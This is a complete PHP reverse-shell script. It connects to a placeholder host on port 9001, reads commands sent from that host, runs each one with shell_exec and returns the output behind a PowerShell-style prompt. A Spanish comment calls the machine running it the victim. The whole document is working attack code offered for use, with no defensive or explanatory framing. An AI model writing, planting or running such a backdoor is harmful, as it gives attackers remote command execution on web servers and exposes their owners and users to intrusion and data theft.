<?php
// // El servidor donde se ejecuta (la víctima principal)
$host = 'IP_ADDRESS';
$port = 9001;

try {
    // Create TCP socket and connect
    $client = socket_create(AF_INET, SOCK_STREAM, 0);
    socket_connect($client, $host, $port);

    while (true) {
        // Receive data from the server
        $data = socket_read($client, 65536);
        if (!$data) {
            break;
        }

        // Decode the command
        $command = trim(utf8_decode($data));

        // Execute the command
        try {
            // Execute command and capture output
            $result = shell_exec($command);

            // Add current directory prompt
            $current_dir = getcwd();
            $sendback = $result . "\nPS " . $current_dir . "> ";
        } catch (Exception $e) {
            $sendback = "Error: " . $e->getMessage() . "\nPS " . getcwd() . "> ";
        }

        // Send response back
        socket_write($client, $sendback, strlen($sendback));
    }
} catch (Exception $e) {
    echo "Connection error: " . $e->getMessage();
} finally {
    try {
        socket_close($client);
    } catch (Exception $e) {
        // Do nothing
    }
}